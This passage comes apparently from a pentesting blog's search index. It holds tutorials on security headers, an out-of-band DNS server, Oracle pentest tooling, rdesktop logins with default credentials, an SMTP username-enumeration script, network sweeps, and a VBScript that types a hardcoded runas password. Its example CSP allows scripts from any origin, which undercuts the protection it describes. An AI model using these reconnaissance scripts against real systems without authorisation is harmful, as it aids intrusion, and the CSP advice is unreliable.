altogether.SAMEORIGIN: iframe can be used only by someone of the same origin.ALLOW-FROM: This will allow pages to be put in iframes only from specific URLs.Nginxadd_header X-Frame-Options \"SAMEORIGIN\";ApacheHeader always set X-Frame-Options \"SAMEORIGIN\"XSS Protection - X-XSS-ProtectionThe XSS Protection header is an older security header that enables cross-site scripting protection in Internet Explorer, Chrome and Firefox. Although this functionality is now provided by CSP, which allows us to block inline JavaScript, the header can still provide protection when used with older browsers that do not support the Content Security Policy header.You can implement XSS protection using the three options depending on the specific need.X-XSS-Protection: 0: This will disable the filter entirely.X-XSS-Protection: 1: This will enable the filter but only sanitizes potentially malicious scripts.X-XSS-Protection: 1; mode=block: This will enable the filter and completely blocks the page.Nginxadd_header X-XSS-Protection \"1; mode=block\";ApacheHeader set X-XSS-Protection \"1; mode=block\"X Content-Type Options - X-Content-Type-OptionsThis header tells the browser that the Multipurpose Internet Mail Extensions (MIME) types advertised in the Content-Type header should be followed. This header was first introduced by Microsoft to prevent MIME sniffing.MIME sniffing is where a browser looks at the contents of a given resource and attempts to detect the MIME type. An attack vector can open up if an attacker can control the content of a resource or upload a new resource to a website, and this Security Header is not advertised in the resource response. The attacker might make non-executable content appear to be executable content and trick the browser into executing it in the victim’s browser.Nginxadd_header X-Content-Type-Options \"nosniff\"ApacheHeader set X-Content-Type-Options \"nosniff\"Strict Transport Security Header (HSTS) - Strict-Transport-SecurityThe first header for discussion is the Strict Transport Security Header (HSTS). The HSTS forces web browsers or clients to communicate with servers but only through HTTPS connections. HSTS ensures that connections only use HTTPS and prevent man in the middle, downgrade, and cookie hijacking attacks. HSTS is a trust on first use (sometimes abbreviated as TOFU), meaning it must send at least one insecure connection over HTTP to the host to transfer the security header.The HSTS preload list is an effort to provide browsers with a list of sites that support HSTS to avoid this initial, insecure connection. However, suppose a site is not on the list but uses the ‘strict-transport-security’ header; after the initial exchange, the browser will only request access to the website over Transport Layer Security (TLS).Nginxadd_header Strict-Transport-Security 'max-age=31536000; includeSubDomains; preload';ApacheHeader set Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\"Content Security Policy (CSP) - Content-Security-PolicyContent Security Policy, sometimes abbreviated as CSP, is a security header that helps mitigate the risk of certain types of data injection attacks such as cross-site scripting. CSP allows website administrators to eliminate or mitigate cross-site scripting by defining a policy that stipulates what locations browsers should trust and allows script execution. The Content Security Policy header is sometimes referred to as a poor man’s Web Application Firewall (WAF).This header is set in HTTP response when an HTML document is requested by a user. Content Security Policy enables the website to list precisely which domains the HTML document can load scripts from. Browsers then deny requests for scripts from any other servers.The architecture of this policy allows sites to safelist only servers containing resources they need, such as CDNs and plugins. As a result, if an attacker successfully gets a page to request a script through a cross-site scripting attack, the browser will refuse to load the script because the origin isn’t on the safelist.In addition to disallowing non-whitelisted sites, a site that implements the Content Security Policy header no longer supports inline JavaScript. This means that sites must remove code within script tags in an HTML file, JavaScript URLs, and inline event handlers and handle those tasks using script files instead.As an ultimate form of protection, sites that want to never allow scripts to be executed can opt to globally disallow script execution. In addition to restricting the domains from which content can be loaded, the server can specify which protocols were allowed. So, for example, a server can specify that all content must be loaded using HTTPS.However, it should be noted that as part of a defence in depth approach, all cookies should be marked with a secure flag to ensure that they can’t be transmitted over HTTP.Nginxadd_header Content-Security-Policy \"default-src 'self'; font-src *;img-src * data:; script-src *; style-src *\";ApacheHeader always set Content-Security-Policy \"default-src 'self'; font-src *;img-src * data:; script-src *; style-src *;\"" }, { "title": "Install A DNS Server For Out Of Band Attacks", "url": "/posts/install-dns-server-out-band-attacks/", "categories": "tutorial", "tags": "dns", "date": "2022-01-01 00:00:00 +0000", "snippet": "Update the Sources Listapt-get updateUpgrade the Serverapt-get upgradeInstall the Mardns serverapt-get install maradnsMove into the Maradns folder then start editing the configcd /etc/maradns/nano ...", "content": "Update the Sources Listapt-get updateUpgrade the Serverapt-get upgradeInstall the Mardns serverapt-get install maradnsMove into the Maradns folder then start editing the configcd /etc/maradns/nano mararc Make the following edits to the marac config filecsv2 = {}csv2[\"evilsaint.com.\"] = \"db.evilsaint.com\"bind_address = \"45.32.176.126\"Create the Zone Filenano db.evilsaint.comInside our file% NS ns.% ~*.% A 45.32.176.126 ~Run the DNS Servermaradns -f mararcls" }, { "title": "Toolbox Series :- rdesktop", "url": "/posts/toolbox-series-rdesktop/", "categories": "tutorial", "tags": "rdesktop", "date": "2021-12-05 00:00:00 +0000", "snippet": "As a general rule you should check every windows machine to see if you can rdesktop to it in the enumeration phase. This will greatly aid you inOperating System IdentificationBasic Syntax for rdesk...", "content": "As a general rule you should check every windows machine to see if you can rdesktop to it in the enumeration phase. This will greatly aid you inOperating System IdentificationBasic Syntax for rdesktop is:root@kali:/# rdesktop 10.0.0.1 There are several other options we might use to further improve our experienceThis will log us in with a username and password of ‘Administrator’ and ‘password’.root@kali:/# rdesktop -u Administrator -p password 10.0.0.1 If we change the password to a - it will prompt for a password on the next line before we log inroot@kali:/# rdesktop -u Administrator -p- 10.0.0.1 Adding -f to our syntax will open up the RDP in full screen mode.root@kali:/# rdesktop -u Administrator -f 10.0.0.1 Adding a -T will allow us to name the desktop anything we like.root@kali:/# rdesktop -u Administrator -p password -T 'my window title' 10.0.0.1 If we dont wish to go full screen we can use the -g to adjust the windows geometryroot@kali:/# rdesktop -u Administrator -p password -T 'my window title' -g 90% 10.0.0.1 Important to note, we should never put the username in quotes unless it has spaces in it and if we use the RDP title option we put it in single quotes." }, { "title": "Installing Oracle Tools For Pentesting", "url": "/posts/installing-oracle-tools-pentesting/", "categories": "tutorial", "tags": "database, odat, oracle", "date": "2021-10-06 00:00:00 +0100", "snippet": "Oracle Tool SetupODATCan install from Apt repository’sapt-get install odat Or we can install the latest version off of GithubInstall the following dependenciessudo apt-get install libaio1 python3-d...", "content": "Oracle Tool SetupODATCan install from Apt repository’sapt-get install odat Or we can install the latest version off of GithubInstall the following dependenciessudo apt-get install libaio1 python3-dev alien python3-pipDownload ODAT (https://github.com/quentinhardy/odat)git clone https://github.com/quentinhardy/odat.gitInstall dependencypip3 install cx_Oracle --upgradeTest if all is good:python3 -c 'import cx_Oracle' This command should just return without errors.Install some python libraries:sudo apt-get install python3-scapysudo pip3 install colorlog termcolor pycrypto passlib python-libnmapsudo pip3 install argcompletesudo activate-global-python-argcomplete3Download and install the development version of pyinstaller (http://www.pyinstaller.org/) for python 3.python setup.py installor install through pip:pip3 install pyinstallerRun ODAT:python3 odat.py -hSQLPlusInstall the Oracle Client Libraries for Kali Linux from the following URLhttps://www.oracle.com/database/technologies/instant-client/downloads.htmlAt the time of writing the URL for my version of Kali was found on this pagehttps://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.htmlBase packagecd /tmpwget https://download.oracle.com/otn_software/linux/instantclient/213000/instantclient-basic-linux.x64-21.3.0.0.0.zipsudo mkdir /opt/oraclesudo unzip instantclient-basic-linux.x64-21.3.0.0.0.zip -d /opt/oracleSQL Pluscd /tmpwget https://download.oracle.com/otn_software/linux/instantclient/213000/instantclient-sqlplus-linux.x64-21.3.0.0.0.zipsudo unzip instantclient-sqlplus-linux.x64-21.3.0.0.0.zip -d /opt/oracleSDKcd /tmpwget https://download.oracle.com/otn_software/linux/instantclient/213000/instantclient-sdk-linux.x64-21.3.0.0.0.zipsudo unzip instantclient-sdk-linux.x64-21.3.0.0.0.zip -d /opt/oracleFiles will look similar to└─$ ls -l /opt/oracle/instantclient_21_3 total 248776-rwxr-xr-x 1 root root 42144 Jul 27 13:18 adrci-rw-r--r-- 1 root root 5780 Jul 27 13:18 BASIC_LICENSE-rw-r--r-- 1 root root 1634 Jul 27 13:18 BASIC_README-rwxr-xr-x 1 root root 59528 Jul 27 13:18 genezi-rw-r--r-- 1 root root 342 Jul 27 13:18 glogin.sqllrwxrwxrwx 1 root root 21 Sep 5 10:30 libclntshcore.so -&gt; libclntshcore.so.21.1lrwxrwxrwx 1 root root 21 Sep 5 10:30 libclntshcore.so.12.1 -&gt; libclntshcore.so.21.1lrwxrwxrwx 1 root root 21 Sep 5 10:30 libclntshcore.so.18.1 -&gt; libclntshcore.so.21.1lrwxrwxrwx 1 root root 21 Sep 5 10:30 libclntshcore.so.19.1 -&gt; libclntshcore.so.21.1lrwxrwxrwx 1 root root 21 Sep 5 10:30 libclntshcore.so.20.1 -&gt; libclntshcore.so.21.1-rwxr-xr-x 1 root root 8108520 Jul 27 13:18 libclntshcore.so.21.1lrwxrwxrwx 1 root root 17 Sep 5 10:30 libclntsh.so -&gt; libclntsh.so.21.1lrwxrwxrwx 1 root root 17 Sep 5 10:30 libclntsh.so.10.1 -&gt; libclntsh.so.21.1lrwxrwxrwx 1 root root 17 Sep 5 10:30 libclntsh.so.11.1 -&gt; libclntsh.so.21.1lrwxrwxrwx 1 root root 17 Sep 5 10:30 libclntsh.so.12.1 -&gt; libclntsh.so.21.1lrwxrwxrwx 1 root root 17 Sep 5 10:30 libclntsh.so.18.1 -&gt; libclntsh.so.21.1lrwxrwxrwx 1 root root 17 Sep 5 10:30 libclntsh.so.19.1 -&gt; libclntsh.so.21.1lrwxrwxrwx 1 root root 17 Sep 5 10:30 libclntsh.so.20.1 -&gt; libclntsh.so.21.1-rwxr-xr-x 1 root root 83460712 Jul 27 13:18 libclntsh.so.21.1-rwxr-xr-x 1 root root 7118328 Jul 27 13:18 libnnz21.solrwxrwxrwx 1 root root 15 Sep 5 10:30 libocci.so -&gt; libocci.so.21.1lrwxrwxrwx 1 root root 15 Sep 5 10:30 libocci.so.10.1 -&gt; libocci.so.21.1lrwxrwxrwx 1 root root 15 Sep 5 10:30 libocci.so.11.1 -&gt; libocci.so.21.1lrwxrwxrwx 1 root root 15 Sep 5 10:30 libocci.so.12.1 -&gt; libocci.so.21.1lrwxrwxrwx 1 root root 15 Sep 5 10:30 libocci.so.18.1 -&gt; libocci.so.21.1lrwxrwxrwx 1 root root 15 Sep 5 10:30 libocci.so.19.1 -&gt; libocci.so.21.1lrwxrwxrwx 1 root root 15 Sep 5 10:30 libocci.so.20.1 -&gt; libocci.so.21.1-rwxr-xr-x 1 root root 2374192 Jul 27 13:18 libocci.so.21.1-rwxr-xr-x 1 root root 142713392 Jul 27 13:18 libociei.so-r-xr-xr-x 1 root root 153584 Jul 27 13:18 libocijdbc21.so-rwxr-xr-x 1 root root 116104 Jul 27 13:18 liboramysql.so-rwxr-xr-x 1 root root 1710024 Jul 27 13:18 libsqlplusic.so-rwxr-xr-x 1 root root 1613888 Jul 27 13:18 libsqlplus.sodrwxr-xr-x 3 root root 4096 Jul 27 13:18 network-rw-r--r-- 1 root root 5053911 Jul 27 13:18 ojdbc8.jardrwxr-xr-x 5 root root 4096 Jul 27 13:18 sdk-rw-r--r-- 1 root root 5780 Jul 27 13:18 SDK_LICENSE-rw-rw-r-- 1 root root 1628 Jul 27 13:18 SDK_README-rwxr-xr-x 1 root root 25104 Jul 27 13:18 sqlplus-rw-r--r-- 1 root root 5780 Jul 27 13:18 SQLPLUS_LICENSE-rw-r--r-- 1 root root 1642 Jul 27 13:18 SQLPLUS_README-rw-r--r-- 1 root root 1790635 Jul 27 13:18 ucp.jar-rwxr-xr-x 1 root root 235904 Jul 27 13:18 uidrvci-rw-r--r-- 1 root root 74603 Jul 27 13:18 xstreams.jarMake sure that libclntsh.so is symlinkedcd /opt/oracle/instantclient_21_3ls -lh libclntsh.so 2 ⨯lrwxrwxrwx 1 root root 17 Sep 5 10:30 libclntsh.so -&gt; libclntsh.so.21.1# ln libclntsh.so.21.1 libclntsh.soConfigure Dynamic Run Timer Linkersudo ldconfigPut the following into ~/.bashrcexport PATH=$PATH:/opt/oracle/instantclient_21_3export SQLPATH=/opt/oracle/instantclient_21_3export TNS_ADMIN=/opt/oracle/instantclient_21_3export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_3export ORACLE_HOME=/opt/oracle/instantclient_21_3Insert the path for our “instantclient” libraries into a file in the /etc/ld.so.conf folder so the system knows where to load them.echo \"/opt/oracle/instantclient_21_3/\" &gt;&gt; /etc/ld.so.conf.d/99_oracleRe-load the bash proflebashWe should now be able to runsqlplusOscannerIf not already installedsudo apt-get install oscannerTNSCmd10gIf not already installedsudo apt-get install tnscmd10gMetasploitcd /tmpwget https://github.com/kubo/ruby-oci8/archive/refs/tags/ruby-oci8-2.2.9.zipwget https://github.com/kubo/ruby-oci8/archive/refs/tags/ruby-oci8-2.1.8.zip # Oracle 9i.wget https://github.com/kubo/ruby-oci8/archive/refs/tags/ruby-oci8-2.0.6.zip # Oracle 8unzip ruby-oci8-2.2.9.zipcd ruby-oci8-ruby-oci8-2.2.9/Install dependencies for us to make the gemsudo apt-get install libgmp-devMake and install the GEMsudo makesudo make installsudo gem install ruby-oci8" }, { "title": "VB Script Tutorial", "url": "/posts/vb-script-tutorial/", "categories": "tutorial", "tags": "vbscript", "date": "2021-09-17 00:00:00 +0100", "snippet": "VB ScriptWSH (Windows Scripting Host) is a powerful scripting environment that comes with Windows Operating System. By default, there are two scripting languages supported, which is JScript and VBS...", "content": "VB ScriptWSH (Windows Scripting Host) is a powerful scripting environment that comes with Windows Operating System. By default, there are two scripting languages supported, which is JScript and VBScript. You could actually open any text editor and write the scripts and save as *.vbs or *.js. Double click them invokes the interpreter, which is cscript.exe or wscript.exe depending on the settings. The cscript.exe will output to console (e.g. using WScript.Echo) while the wscript.exe will treat WScript.Echo as MsgBox (output using dialog). Sometimes, you could choose other languages as the host languages in WSH, but this is not installed by default, and you have to download corresponding installer.The advantages of writing scripts to run in WSH are: You do not need to compile them, just save and run immediately, which are suitable for lightweight small and daily tasks. The scripts can be edited/changed and distributed easily. The same scripts can be interpreted for both 32 and 64 bit, just specify the corresponding cscript.exe or wscript.exe respectively.You could actually use WScript.Shell object (COM Automation) to SendKeys to the active window, in which case, you could do something as powerful as macros. The keystrokes are being sent to the active window.The following runs the notepad.exe and bring the notepad to the front. The second parameter 9 means: make active and display the window. If the window is minimized or maximized, the system restores it to its original size and position.Set WshShell = WScript.CreateObject(\"WScript.Shell\")WshShell.Run \"notepad\", 9Now the following will type in “Hello, World!”” one character after another, with a short pause 200ms between characters. And finally, it will simulate Alt+F4 to exit. At this time, the dialog will pop up for saving, and press Tab to navigate to Don’t Save button and press Enter to exit.' Give Notepad time to loadWScript.Sleep 500Dim Msg: Msg = \"Hello, World!\"' Type in One Character at a timeFor i = 1 To Len(Msg) WScript.Sleep 200 WshShell.SendKeys Mid(Msg, i, 1)NextWshShell.SendKeys \"{ENTER}\"WshShell.SendKeys \"%{F4}\"WshShell.SendKeys \"{TAB}\"WshShell.SendKeys \"{ENTER}\" The specified keys, functional keys, ctrl, alt are enclosed by {braces}.You can combine keys, for example, + (plus) is the prefix for shift, Ctrl is denoted using prefix ^ and % (percentage) is for ALT.Let’s review the above example one more time, but in JScript.(function () { var WshShell = WScript.CreateObject(\"WScript.Shell\"); WshShell.Run(\"notepad\", 9); var msg = \"Hello, World!\"; // Give Notepad time to load WScript.Sleep(500); for (i = 0; i &lt; msg.length; i ++) { WScript.Sleep(200); WshShell.SendKeys(msg.charAt(i)); } WshShell.SendKeys(\"{ENTER}\"); // Alt + F4 WshShell.SendKeys(\"%{F4}\"); // Naviagate to Don't Save WshShell.SendKeys(\"{TAB}\"); // Exit WshShell.SendKeys(\"{ENTER}\");})();Another SendKey Exampleset WshShell = WScript.CreateObject(\"WScript.Shell\")WshShell.run \"runas /user:ladm \" &amp; WScript.Arguments.Item(0)WScript.Sleep 1000WshShell.SendKeys \"Pm2fUXScqI\"WshShell.SendKeys \"{ENTER}\"WScript.Sleep 3000Contains a function that will take an argument to the script with “WScript.Arguments.Item(0)”.When you run the vbscript, make sure you supply the executable name as an argument, which should result in the second line doing runas /user:ladm executable_name.exe.Your command should be something along the lines of:cscript vbscript.vbs executable_name.exeYou should be then able to run the script with your executable as an argument, and it should work." }, { "title": "Ruby Tutorial", "url": "/posts/ruby-tutorial/", "categories": "tutorial", "tags": "ruby", "date": "2021-09-17 00:00:00 +0100", "snippet": "RubyGemsGetting help with gemsgem helpSearching for a gemgem search [string]Search remotely for a gem related to httpgem search -r httpTo get help searchinggem search -hTo install a gemgem install ...", "content": "RubyGemsGetting help with gemsgem helpSearching for a gemgem search [string]Search remotely for a gem related to httpgem search -r httpTo get help searchinggem search -hTo install a gemgem install [gem name]gem install openssl-extensionsHelp is available with install alsogem install -hTo list locally installed gemsgem listVariable Scopes Variable Scope @var instance scope @@var class scope $var Global scope Time and DateAssign Time right now to a variabletime = Time.nowString MethodsSome example string methodsst = \"a string for me to be testing\"st.empty?st.clearst.lengthst.sizest.start_with? \"a\"st.eng_with? \"ing\"st.insert(10,\"cat\") # insert the word cat at 10th charst.upcasest.downcasest.capitalizest.reversest.chop # removes whatever the trailing char isUsing pry we could type “st.” and then use tab completion to show the possibilitiesReferencing parts of a string and assigning values to parts of a stringAssuming st = \"this is my string\"replaces the word string with codest[\"string\"] = \"code\"replaces the word “this” with “that”st[1..4] = \"that\"Sub and GsubSub replaces the first occurrence of a string while Gsub replaces all occurrences. Assuming st = \"No one is like PHP. PHP is awesome\"&gt;&gt; st.sub(\"PHP\",\"Ruby\")=&gt; \"No one is like Ruby. PHP is awesome\"&gt;&gt; st.gsub(\"PHP\",\"Ruby\")=&gt; \"No one is like Ruby. Ruby is awesome\" Note, sub and gsub just return a copy of the string with the proper substitution. If you want to modify the original string you have to use sub! or gsub!Make a permenant change to the variablest.sub!(\"Search\",\"Replace\")st.gsub!(\"Search\",\"Replace\")Freeze and FrozenIt is possible to make a string immutable (prevent it from being changed). We can do this with the freeze method. The freeze method works on an object, not the variable that refers to a frozen object.Freeze (make an object immutable)st.freezeTest if object has been frozen with the freeze methodst.frozen?For examplest = \"i will make this immutable\"st.freezest.concat(\"trying to append\") # this won't work, string itself cannot be altered We can change the existing variable but we can assign a new value over the top like this st = \"new value completely\"Bypassing String EscapesWrite strings without the quotation delimitersprint %[delimiter is using the brackets]A Ruby Heredoc (in this example EVILSAINT is the delimiter)St = &lt;&lt;EVILSAINTThis is whatever I want it to be with whatever formattingI would like \" \" ' / \\Over multiple lines too….Yeah for spaces and heredocsEVILSAINTConcatenating strings (various methods): notation St = \"Ruby\" + \" is an \" + \"awesome language\" Juxtaposition\"Hello \" \"World\" \"!!!!!!!\"« notation\"You \" &lt;&lt; \"are \" &lt;&lt; \"Welcome!\"OO Style\"Ruby \".concat(\"is \").concat(\"awesome!\")ArraysThe following methods can all be used to access different elements of the days arraydays = [\"mon\",\"tues\",\"wed\",\"thu\",\"fri\",\"sat\",\"sun\"]days[3]days[-1]days[-2]days.at(0)days.firstdays.lastdays[3..5]We can inset into arrays (here we inset the number 10 into the first element)a = [ 7, 3, 8]a.insert(1, 10)We can also delete. Here is two ways of achieving the same thing. We can delete the value 10 or we can delete the element at index 1a.delete(10)a.delete_at(1)Useful array methodsa = [1, 10, 4, 32, 5, 88, 11, 32]a.sorta.reversea.uniqa.maxa.mina.join(\" \") # takes an argument to place between itemsa.join # no parameter means array will be joined without\"1:2:3:4:5:6\".split \":\" # makes an array from stringFile SystemList FilesDir[\"/Home/*.txt\"]Copy FilesFileUtils.cp('comics.txt', '/Home/comics.txt')Write to FilesFile.open(\"/Home/comics.txt\", \"a\") do |f| f.puts \"put this in file\"endPrint File to Screenprint File.read(\"/Home/comics.txt\")Find out when file was last modifiedFile.mtime(\"/Home/comics.txt\")File.mtime(\"/Home/comics.txt\").hourDefine a functiondef load_comics( path ) comics = {} File.foreach(path) do |line| name, url = line.split(': ') comics[name] = url.strip end comicsendInheritanceclass ApplicationError def display_error puts \"Error! Error!\" endendclass SuperBadError &lt; ApplicationErrorenderr = SuperBadError.newerr.display_errorObject OrientatedClass conventions for setters/gettersattr_readerattr_writerattr_accessorModulesmodule ModuleName # Bits 'n piecesendRuby One LinersRuby command line switches Option Description -I[.ext] In place edit. If given an extension it backs up first -e Allows you to run a command on the command line as opposed from a script or interactive prompt Read a file from command line$ ruby -pe 0 'file'Count the number of lines in a file$ ruby -ne 'END {print \"Lines: \",$.,\"\\n\"}' fileMake a backup copy of a file and replace all the ‘foo’ strings with ‘FOO’$ ruby -i.bak -pe 'gsub \"foo\", \"FOO\"' *.txtInteractive Rubyapt-get install prypry --simple-promptMake a list of IP addressesARGV[1].upto(ARGV[2]) {|i| print ARGV[0],\".\",I,\"\\n\"}2.upto(254) {|i| print \"192.168.1\",\".\",I,\"\\n\"}Pinging hosts&gt;&gt; require 'net/ping'=&gt; true&gt;&gt; req = Net::Ping::ICMP.new(\"8.8.8.8\")=&gt; #&lt;Net::Ping::ICMP:0x000055f5127a98f8Nokogirirequire 'open-uri'require 'nokogiri'require 'resolv-replace'eztv = Nokogiri::HTML(open(\"https://eztv.bypassed.eu/shows/887/the-blacklist/\"))&gt;&gt; eztv.title#=&gt; \"EZTV Proxy Mirror - The Blacklist Torrent Download - EZTV\"eztv.xpath(\"//a\").css(\".download_1\").each do |link|\tputs \"#{link['title']}: #{link['href']}\"endFile.open(\"blacklist.out\",\"w\") do |line|\teztv.xpath(\"//a\").css(\".download_1\").each do |link|\t\tline.puts \"#{link['title']} | #{link['href']}\"\tendendimdb = Nokogiri::HTML(open(\"http://www.imdb.com/title/tt1405406/episodes?season=1\"))imdb.css(\"div.eplist div.info div.image\")[0]Debug to look where you are in the documentation&gt;&gt; links.class.name#=&gt; \"Nokogiri::XML::NodeSet\"" }, { "title": "Python Tutorial", "url": "/posts/python-tutorial/", "categories": "tutorial", "tags": "python", "date": "2021-09-17 00:00:00 +0100", "snippet": "layout: posttitle: Pythonweight: 10—Pythonsha-bang#!/usr/bin/pythonMore portable sha-bang#!/usr/bin/env pythonSMTP Script for detecting usernames#!/usr/bin/env pythonimport socketimport sysif len(s...", "content": "layout: posttitle: Pythonweight: 10—Pythonsha-bang#!/usr/bin/pythonMore portable sha-bang#!/usr/bin/env pythonSMTP Script for detecting usernames#!/usr/bin/env pythonimport socketimport sysif len(sys.argv) != 3: print \"Usage: smtp.py &lt;list usernames&gt; &lt;list of ips&gt;\" sys.exit(0)usernames = sys.argv[1]ip_address = sys.argv[2]with open(ip_address, \"r\") as ips: for ip in ips: print \"[x]\"+ip # Create a Socket s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Connect to the Server connect=s.connect((ip,25)) # Receive the banner banner=s.recv(1024) print banner with open(usernames, \"r\") as users: for user in users: print \"[x]\"+user # VRFY a user s.send('VRFY ' + user + '\\r\\n') result=s.recv(1024) print result # Close the socket s.close()ScapyLists supported protocol layers. If a protocol layer is given as parameter, lists its fields and types of fields.ls()We can give the ls command individual protocolsls(ARP)ls(ICMP)Lists some user commands. If a command is given as parameter, its documentation is displayed.lsc()This object contains the configuration.confSniffingSniff 100 packets on interface eth0. Important no quotes around count integer.pkts = sniff(iface=\"eth0\", count=100)Sniff 10 Arp packets on interface eth0. Important no quotes around count integer.arppkts = sniff(iface=\"eth0\", filter=\"arp\", count=10)Display a packet summary after collectionpktsLook at one packet (indexed from 0)print pkts[0]Shown in more user friendly wayprint pkts[0].show()Shown a summaryprint pkts[0].show()Write to a pcap filewrpcap(\"/tmp/tcpdump-demo\", mypkts)Read from a pcap fileread_pkts = rdpcap(\"/tmp/tcpdump-practice\")Send an icmp packet&gt;&gt;&gt; pkt = IP(dst=\"192.168.1.69\")/ICMP()/\"EvilSaint was here so look out\"&gt;&gt;&gt; send(pkt)ScanningArp scanner#!/usr/bin/pythonfrom scapy.all import *# Subnet Scannerfor host in range(64,254): ip = \"192.168.1.\" +str(host) print ip arpRequest = Ether(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(pdst=ip, hwdst=\"ff:ff:ff:ff:ff:ff\") arpResponse = srp1(arpRequest, timeout=1, verbose=0) if arpResponse: print \"IP: \" + arpResponse.psrc + \" MAC: \" + arpResponse.hwsrcScrapingPrint Web Page Headersimport urllibhttpResponse = urllib.urlopen(\"http://www.nottingham.ac.uk/\")for header, value in httpResponse.headers.items(): print header + ' : ' + valueRead the html on the pagehttpResponse.read()BeautifulSoupGrab Page and Parse it scriptfrom bs4 import BeautifulSoupimport urllibhtml = urllib.urlopen(\"http://www.securitytube.net/video/3000\")bt = BeautifulSoup(html.read(), \"lxml\")bt.title# &lt;title&gt;Defcon 19 - The Art Of Trolling&lt;/title&gt;bt.title.string# u'Defcon 19 - The Art Of Trolling'all_meta_tags = bt.find_all('meta')print all_meta_tags# [&lt;meta content=\"6xTaa3p8o4OQd0L-iD2eRvaDjJR8rxUdSyZ1Etm5LMI\" name=\"google-site-verification\"/&gt;, &lt;meta content=\"text/html;charset=unicode-escape\" http-equiv=\"Content-Type\"/&gt;]print all_meta_tags[0]# &lt;meta content=\"6xTaa3p8o4OQd0L-iD2eRvaDjJR8rxUdSyZ1Etm5LMI\" name=\"google-site-verification\"/&gt;print all_meta_tags[0]['content']# 6xTaa3p8o4OQd0L-iD2eRvaDjJR8rxUdSyZ1Etm5LMIatags = bt.find_all('a')for link in atags: print link['href'], link.string# Get all the text on a pagebt.get_text()" }, { "title": "Perl Tutorial", "url": "/posts/perl-tutorial/", "categories": "tutorial", "tags": "perl", "date": "2021-09-17 00:00:00 +0100", "snippet": "PerlWhile many canned security tools are available on this site for handling common tasks, scripting languages allow you to write your own (or modify existing ones) when you need something more cus...", "content": "PerlWhile many canned security tools are available on this site for handling common tasks, scripting languages allow you to write your own (or modify existing ones) when you need something more custom. Quick, portable scripts can test, exploit, or even fix systems. Archives like CPAN are filled with modules such as Net::RawIP and protocol implementations to make your tasks even easier. Many security tools use scripting languages heavily for extensibility. For example Scapy interaction is through a Python interpreter, Metasploit modules are written in Ruby, and Nmap’s scripting engine uses Lua.http://www.perl.orghttp://www.python.orghttp://www.ruby-lang.org All official versions are free of charge Works natively on Linux. Works natively on Apple Mac OS X. Works natively on Microsoft Windows. Features a command-line interface. Source code available for inspection. General-purpose tools" }, { "title": "CMD Tutorial", "url": "/posts/cmd-tutorial/", "categories": "tutorial", "tags": "cmd, windows", "date": "2021-09-17 00:00:00 +0100", "snippet": "layout: posttitle: CMD weight: 10—CMDFor LoopsOverviewFOR\tLoop through a set of files in one folderFOR /R\tLoop through files (recurse subfolders)FOR /D\tLoop through several foldersFOR /L\tLoop throu...", "content": "layout: posttitle: CMD weight: 10—CMDFor LoopsOverviewFOR\tLoop through a set of files in one folderFOR /R\tLoop through files (recurse subfolders)FOR /D\tLoop through several foldersFOR /L\tLoop through a range of numbersFOR /F\tLoop through items in a text fileFOR /F\tLoop through the output of a commandA loop with no modifier options will run a specified command for each file in a set of files (won’t act on directories).FOR %variable IN (set) DO command [command-parameters] To use the FOR command in a batch program, specify %%variable instead of %variable. Variable names are case sensitive, so %i is different from %IFor Loop ModifiersUsing the /D modifier modifies are loop so that it only iterates and acts over filesFOR /D %variable IN (set) DO command [command-parameters]Using the /R modifier we are able to walk recursively listing files. We can either add a drive and path after the /R option and we will start recursively from that point. If we miss out the drive and path then we start recursive from the working directory.FOR /R [[drive:]path] %variable IN (set) DO command [command-parameters]Using the /L modifier we can loop over sequences of numbers from start to end, and even indicate what amount to step up byFOR /L %variable IN (start,step,end) DO command [command-parameters] The set is a sequence of numbers from start to end, by step amount. So (1,1,5) would generate the sequence 1 2 3 4 5 and (5,-1,1) would generate the sequence (5 4 3 2 1)The /F modifierThe /F modifier can be used to construct some very powerful loops.Each file is opened, read and processed before going on to the next file in file-set. Processing consists of reading in the file, breaking it up into individual lines of text and then parsing each line into zero or more tokens.FOR /F [\"options\"] %variable IN (file-set) DO command [command-parameters]FOR /F [\"options\"] %variable IN ('string') DO command [command-parameters]FOR /F [\"options\"] %variable IN (`command`) DO command [command-parameters] Option Description eol=c specifies an end of line comment character (just one) skip=n specifies the number of lines to skip at the beginning of the file. delims=xxx specifies a delimiter set. This replaces the default delimiter set of space and tab. tokens=x,y,m-n specifies which tokens from each line are to be passed to the for body for each iteration. This will cause additional variable names to be allocated. The m-n form is a range, specifying the mth through the nth tokens. If the last character in the tokens= string is an asterisk, then an additional variable is allocated and receives the remaining text on the line after the last token parsed. usebackq specifies that the new semantics are in force, where a back quoted string is executed as a command and a single quoted string is a literal string command and allows the use of double quotes to quote file names in filenameset. Examples of the different loopsLoop through all filesC:\\ for %i in (C:\\Windows\\System32\\*) do @echo name: %i attrib: %~aiLoop through all directories (only difference is addition of /D)C:\\ for /D %i in (C:\\Windows\\System32\\*) do @echo name: %i attrib: %~aiLoop through all files recursivelyfor /R C:\\Windows %i in (*) do @echo name: %i attrib: %~aiLoop through all folders recursivelyfor /R C:\\Windows /D %i in (*) do @echo name: %i attrib: %~aiA loop around a sequence of numbers between 2-254 piped to ping to make a ping sweeperfor /L %i in (2,1,254) do ping -n 2 127.0.0.%iBatch File LoopsHere is how we would write FOR loops inside a batch file with the %%.Loop through text files and echo file namefor %%F IN (*.txt) DO @echo %%FLoop through text files and output the file contentsfor %%F IN (*.txt) DO @echo %%F" }, { "title": "C Tutorial", "url": "/posts/c-tutorial/", "categories": "tutorial", "tags": "c", "date": "2021-09-17 00:00:00 +0100", "snippet": "CC is a general-purpose, procedural computer programming language, developed byR&amp;D company Bell Labs back in 1972. It’s a widely used programming language,most notably in systems programming fo...", "content": "CC is a general-purpose, procedural computer programming language, developed byR&amp;D company Bell Labs back in 1972. It’s a widely used programming language,most notably in systems programming for operating systems, compilers,interpreters, libraries of other programming languages and in implementationsof embedded system applications. For example, Linux and Windows kernel arewritten in C, most of GNU components and also Python, PHP, Ruby, Perl interpreters.Before a C program can do anything, it first needs to be compiled,i.e. translated from C source into a binary code which can instruct the CPU.The C language provides no built-in facilities for performing commonoperations such as input/output, memory management, string manipulation, and the others. Instead, these facilities are defined in a standard libraries, which you compile and link with your programs.Information about standard and other libraries should be included inside the first lines of the code. The following line includes the standard 